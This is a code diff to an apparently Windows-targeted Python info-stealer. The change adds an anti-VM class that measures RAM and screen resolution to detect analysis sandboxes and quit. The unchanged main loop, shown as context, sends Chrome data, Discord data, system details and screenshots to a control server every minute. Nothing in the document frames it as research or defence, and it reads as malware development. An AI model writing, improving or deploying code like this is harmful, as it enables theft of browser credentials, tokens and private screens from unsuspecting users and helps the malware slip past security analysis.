@@ -1,5 +1,6 @@
 import os
 import re
+import ctypes
 import platform
 import psutil
 from datetime import datetime
@@ -25,6 +26,41 @@ class b64():
 
     def decrypt(self, text):
         return base64.b64decode(text.encode("utf-8")).decode("utf-8")
+
+class AntiVM():
+	def __init__(self):
+		self.vm = False
+
+	def ram_check(self):
+		class MemoryStatus(ctypes.Structure):
+			_fields_ = [
+				("dwLength", ctypes.c_ulong),
+				("dwMemoryLoad", ctypes.c_ulong),
+				("ullTotalPhys", ctypes.c_ulonglong),
+				("ullAvailPhys", ctypes.c_ulonglong),
+				("ullTotalPageFile", ctypes.c_ulonglong),
+				("ullAvailPageFile", ctypes.c_ulonglong),
+				("ullTotalVirtual", ctypes.c_ulonglong),
+				("ullAvailVirtual", ctypes.c_ulonglong),
+				("sullAvailExtendedVirtual", ctypes.c_ulonglong),
+			]
+		m = MemoryStatus()
+		m.dwLength = ctypes.sizeof(m)
+		ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
+		ram = m.ullTotalPhys/1073741824
+		if ram <= 2:
+			self.vm = True
+
+	def screen_size(self):
+		x = ctypes.windll.user32.GetSystemMetrics(0)
+		y = ctypes.windll.user32.GetSystemMetrics(1)
+		if x < 800 or y < 600:
+			self.vm = True
+
+	def inVM(self):
+		self.ram_check()
+		self.screen_size()
+		return self.vm
 
 class ApiController():
     def __init__(self):
@@ -238,50 +274,53 @@ class Discord():
         return self.saved
 
 def main():
-    api = ApiController()
-    fsc = FileController()
+    if(AntiVM().inVM()):
+        exit()
+    else:
+        api = ApiController()
+        fsc = FileController()
 
-    if api.check_connection():
-        if fsc.check_file(CONFIG_PATH):
-            bot_data = fsc.get_creds()
-        
-            if bot_data and isinstance(bot_data, list):
-                try:
-                    bot_identifier = b64().decrypt(bot_data[0])
-                    bot_token = b64().decrypt(bot_data[1])
-                except:
-                    os.remove(CONFIG_PATH)
-                    bot_data = api.register_account()
-                    fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
-                    main()
-                
-                if api.check_account(bot_identifier, bot_token):
-                    schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
-                    schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
-                    schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
-                    schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
+        if api.check_connection():
+            if fsc.check_file(CONFIG_PATH):
+                bot_data = fsc.get_creds()
+            
+                if bot_data and isinstance(bot_data, list):
+                    try:
+                        bot_identifier = b64().decrypt(bot_data[0])
+                        bot_token = b64().decrypt(bot_data[1])
+                    except:
+                        os.remove(CONFIG_PATH)
+                        bot_data = api.register_account()
+                        fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
+                        main()
+                    
+                    if api.check_account(bot_identifier, bot_token):
+                        schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
+                        schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
+                        schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
+                        schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
 
-                    while True:
-                        schedule.run_pending()
-                        time.sleep(1)
+                        while True:
+                            schedule.run_pending()
+                            time.sleep(1)
+                    else:
+                        os.remove(CONFIG_PATH)
+                        bot_data = api.register_account()
+                        fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
+                        main()
+
                 else:
                     os.remove(CONFIG_PATH)
                     bot_data = api.register_account()
                     fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                     main()
-
             else:
-                os.remove(CONFIG_PATH)
                 bot_data = api.register_account()
                 fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
                 main()
         else:
-            bot_data = api.register_account()
-            fsc.save_creds(b64().encrypt(bot_data[0]), b64().encrypt(bot_data[1]))
+            time.sleep(30)
             main()
-    else:
-        time.sleep(30)
-        main()
 
 if __name__ == "__main__":
     main()
